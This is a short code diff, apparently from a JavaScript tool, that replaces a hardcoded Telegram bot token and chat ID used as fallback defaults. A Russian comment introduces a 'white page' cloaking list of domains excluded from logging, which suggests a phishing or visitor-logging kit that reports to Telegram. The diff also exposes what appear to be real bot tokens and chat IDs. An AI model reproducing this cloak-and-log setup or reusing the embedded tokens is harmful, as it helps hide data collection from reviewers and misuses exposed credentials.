@@ -21,8 +21,8 @@ try {
 }
 
 // Telegram Bot Configuration
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003622716214';
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';
 
 // Белая страница (клоака) - домены которые НЕ должны логироваться
 const WHITE_PAGE_DOMAINS = [
